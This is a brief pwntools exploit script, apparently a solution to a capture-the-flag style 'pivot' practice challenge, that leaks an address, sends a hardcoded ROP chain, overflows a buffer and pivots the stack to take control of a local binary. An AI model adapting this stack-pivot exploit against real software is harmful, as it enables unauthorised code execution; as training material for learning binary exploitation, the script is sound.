from pwn import *

#conn = gdb.debug('./pivot')
conn = process('./pivot')

conn.recvuntil('pivot: ')
pivot = int(conn.recvline().strip(), 16)
log.info('pivot: ' + hex(pivot))

payload = p64(0x400720)
payload += p64(0x4009bb)
payload += p64(0x601040)
payload += p64(0x4009c0)
payload += p64(0x4007c8)
payload += p64(0x117)
payload += p64(0x4009c4)
payload += p64(0x4006b0)

conn.sendlineafter('> ', payload)

payload = b'A' * 0x28
payload += p64(0x4009bb)
payload += p64(pivot)
payload += p64(0x4009bd)

conn.sendlineafter('> ', payload)
conn.interactive()
